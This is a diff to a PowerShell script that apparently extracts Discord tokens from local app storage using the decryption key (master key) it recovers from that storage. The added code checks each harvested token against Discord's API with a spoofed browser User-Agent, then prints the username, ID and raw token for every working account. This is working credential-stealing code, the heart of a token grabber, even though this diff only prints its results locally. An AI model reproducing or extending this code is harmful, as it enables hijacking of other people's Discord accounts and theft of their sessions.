@@ -120,6 +120,40 @@ $PATHS = @{
 
 Add-Type -AssemblyName System.Security
 
+function Test-TokenValidity {
+    param (
+        [string]$Token
+    )
+
+    try {
+        $headers = @{
+            "Authorization" = $Token
+            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
+
+        $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" `
+                                     -Method Get `
+                                     -Headers $headers `
+                                     -ErrorAction Stop `
+                                     -TimeoutSec 5
+
+        if ($response -and $response.username) {
+            return @{
+                Valid = $true
+                Username = $response.username
+                Discriminator = $response.discriminator
+                GlobalName = $response.global_name
+                Id = $response.id
+            }
+        }
+
+        return @{ Valid = $false }
+    }
+    catch {
+        return @{ Valid = $false }
+    }
+}
+
 function Get-MasterKey {
     param (
         [string]$BasePath
@@ -295,14 +329,80 @@ if ($allTokens.Count -eq 0) {
     Write-Host "`nNo tokens found." -ForegroundColor Yellow
 } else {
     Write-Host "`n========================================" -ForegroundColor Cyan
-    Write-Host "Gefundene Tokens:" -ForegroundColor Cyan
+    Write-Host "Validating Tokens..." -ForegroundColor Cyan
     Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    $validatedTokens = @{}
+    $totalTokens = 0
+    $validTokens = 0
 
     foreach ($platform in $allTokens.Keys) {
-        Write-Host "`n[$platform]" -ForegroundColor Green
         foreach ($token in $allTokens[$platform]) {
-            Write-Host "  $token" -ForegroundColor White
+            $totalTokens++
         }
+    }
+
+    $currentToken = 0
+
+    foreach ($platform in $allTokens.Keys) {
+        $platformValidTokens = @()
+
+        foreach ($token in $allTokens[$platform]) {
+            $currentToken++
+            Write-Host "`rValidating token $currentToken/$totalTokens..." -ForegroundColor Gray -NoNewline
+
+            $validation = Test-TokenValidity -Token $token
+            Start-Sleep -Milliseconds 300  # Rate limiting
+
+            if ($validation.Valid) {
+                $validTokens++
+                $platformValidTokens += @{
+                    Token = $token
+                    Username = $validation.Username
+                    Discriminator = $validation.Discriminator
+                    GlobalName = $validation.GlobalName
+                    Id = $validation.Id
+                }
+            }
+        }
+
+        if ($platformValidTokens.Count -gt 0) {
+            $validatedTokens[$platform] = $platformValidTokens
+        }
+    }
+
+    Write-Host "`r" -NoNewline
+    Write-Host (" " * 50) -NoNewline  # Clear the progress line
+    Write-Host "`r" -NoNewline
+
+    if ($validatedTokens.Count -eq 0) {
+        Write-Host "`n[!] No valid tokens found (all tokens are invalid or expired)" -ForegroundColor Yellow
+    } else {
+        Write-Host "`n========================================" -ForegroundColor Cyan
+        Write-Host "Valid Tokens Found ($validTokens/$totalTokens):" -ForegroundColor Cyan
+        Write-Host "========================================" -ForegroundColor Cyan
+
+        foreach ($platform in $validatedTokens.Keys) {
+            Write-Host "`n[$platform]" -ForegroundColor Green
+            foreach ($tokenData in $validatedTokens[$platform]) {
+                $displayName = if ($tokenData.GlobalName) {
+                    $tokenData.GlobalName
+                } else {
+                    "$($tokenData.Username)#$($tokenData.Discriminator)"
+                }
+
+                Write-Host "  User: " -ForegroundColor Gray -NoNewline
+                Write-Host "$displayName" -ForegroundColor Cyan -NoNewline
+                Write-Host " (ID: $($tokenData.Id))" -ForegroundColor DarkGray
+                Write-Host "  Token: " -ForegroundColor Gray -NoNewline
+                Write-Host "$($tokenData.Token)" -ForegroundColor White
+                Write-Host ""
+            }
+        }
+
+        Write-Host "========================================" -ForegroundColor Cyan
+        Write-Host "[*] Note: Keep your tokens secure and never share them!" -ForegroundColor Yellow
     }
 }
 
